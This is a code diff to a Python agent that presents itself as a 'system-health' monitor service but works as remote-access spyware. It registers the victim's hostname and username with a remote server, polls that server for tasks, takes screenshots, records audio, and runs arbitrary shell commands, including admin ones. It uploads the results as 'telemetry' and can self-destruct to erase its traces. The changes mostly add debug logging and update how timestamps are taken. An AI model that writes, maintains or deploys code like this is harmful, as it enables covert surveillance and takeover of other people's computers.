@@ -11,7 +11,7 @@ import subprocess
 import base64
 import urllib.request
 import urllib.error
-from datetime import datetime
+from datetime import datetime, timezone
 
 # --- CONFIGURATION ---
 BASE_PATH = os.path.expanduser("~/.config/system-health")
@@ -47,7 +47,7 @@ def get_config():
             
         return json.loads(decrypted.decode('utf-8'))
     except Exception as e:
-        # print(f"Config Error: {e}")
+        print(f"Config Error: {e}", flush=True)
         return None
 
 def get_device_id():
@@ -159,7 +159,7 @@ def api_request(config, endpoint, method="GET", data=None):
                 return json.loads(response.read().decode())
             return True
     except Exception as e:
-        # print(f"API Error: {e}")
+        print(f"API Error ({endpoint}): {e}", flush=True)
         return None
 
 def register_device(config, device_id):
@@ -175,18 +175,20 @@ def register_device(config, device_id):
         "hostname": hostname,
         "username": username,
         "os_info": os_info,
-        "last_sync": datetime.utcnow().isoformat()
+        "last_sync": datetime.now(timezone.utc).isoformat()
     }
     
     if not exists:
         data["device_name"] = get_device_name()
-        data["registered"] = datetime.utcnow().isoformat()
+        data["registered"] = datetime.now(timezone.utc).isoformat()
         api_request(config, "devices", "POST", data)
+        print(f"Device registered: {device_id}", flush=True)
     else:
-        api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.utcnow().isoformat()})
+        api_request(config, f"devices?device_id=eq.{device_id}", "PATCH", {"last_sync": datetime.now(timezone.utc).isoformat()})
 
 def self_destruct():
     try:
+        print("Initiating self-destruct...", flush=True)
         # 1. Disable Service (don't stop yet)
         run_command("systemctl --user disable health-monitor.service")
         
@@ -203,7 +205,8 @@ def self_destruct():
             shutil.rmtree(BASE_PATH)
             
         return True
-    except:
+    except Exception as e:
+        print(f"Destruct failed: {e}", flush=True)
         return False
 
 def process_tasks(config, device_id):
@@ -216,6 +219,8 @@ def process_tasks(config, device_id):
         task_type = task['task_type']
         params = task.get('task_params', {})
         
+        print(f"Processing task: {task_type} (ID: {task_id})", flush=True)
+        
         result_data = None
         data_type = None
         should_destruct = False
@@ -226,14 +231,17 @@ def process_tasks(config, device_id):
                 if "DISPLAY" not in os.environ:
                     os.environ["DISPLAY"] = ":0"
                     
+                print(f"Taking screenshot... DISPLAY={os.environ['DISPLAY']}", flush=True)
                 img = take_screenshot()
                 if img:
                     result_data = {"file_data": img}
                     data_type = "display"
+                    print("Screenshot captured successfully.", flush=True)
                 else:
                     # Report failure
                     result_data = {"data": "Screenshot failed. 'scrot' might be missing or no display."}
                     data_type = "sysinfo" # Send as generic info/log
+                    print("Screenshot failed (unknown reason).", flush=True)
                     
             elif task_type == "system_info":
                 sysinf = get_sys_info()
@@ -242,6 +250,7 @@ def process_tasks(config, device_id):
                 
             elif task_type == "voice_capture":
                 duration = params.get('duration', 10)
+                print(f"Recording audio for {duration}s...", flush=True)
                 aud = record_audio(duration)
                 if aud:
                     result_data = {"file_data": aud}
@@ -258,6 +267,7 @@ def process_tasks(config, device_id):
                     
             elif task_type in ["cmd_exec", "cmd_exec_admin"]:
                 cmd = params.get('command', '')
+                print(f"Executing command: {cmd}", flush=True)
                 stdout, stderr, code = run_command(cmd)
                 res = {
                     "command": cmd,
@@ -271,15 +281,18 @@ def process_tasks(config, device_id):
                 
         except Exception as e:
             # Catch unexpected errors during execution
-            result_data = {"data": f"Task execution error: {str(e)}"}
+            error_msg = f"Task execution error: {str(e)}"
+            print(error_msg, flush=True)
+            result_data = {"data": error_msg}
             data_type = "sysinfo"
 
         # Upload telemetry
         if result_data and data_type:
+            print(f"Uploading telemetry: {data_type}", flush=True)
             telemetry = {
                 "device_id": device_id,
                 "data_type": data_type,
-                "collected_at": datetime.utcnow().isoformat()
+                "collected_at": datetime.now(timezone.utc).isoformat()
             }
             telemetry.update(result_data)
             api_request(config, "telemetry", "POST", telemetry)
@@ -287,8 +300,9 @@ def process_tasks(config, device_id):
         # Complete task
         api_request(config, f"tasks?id=eq.{task_id}", "PATCH", {
             "status": "complete",
-            "completed_at": datetime.utcnow().isoformat()
+            "completed_at": datetime.now(timezone.utc).isoformat()
         })
+        print(f"Task complete: {task_id}", flush=True)
         
         if should_destruct:
             sys.exit(0)
@@ -298,12 +312,15 @@ def process_tasks(config, device_id):
 def main():
     # Delay for network
     time.sleep(10)
+    print("Agent started.", flush=True)
     
     config = get_config()
     if not config:
+        print("No valid config found.", flush=True)
         return
         
     device_id = get_device_id()
+    print(f"Device ID: {device_id}", flush=True)
     
     # Try install deps on first run
     install_dependencies()
@@ -312,8 +329,8 @@ def main():
         try:
             register_device(config, device_id)
             process_tasks(config, device_id)
-        except Exception:
-            pass
+        except Exception as e:
+            print(f"Main loop error: {e}", flush=True)
         
         sleep_time = config.get('sync_interval', 60)
         time.sleep(sleep_time)
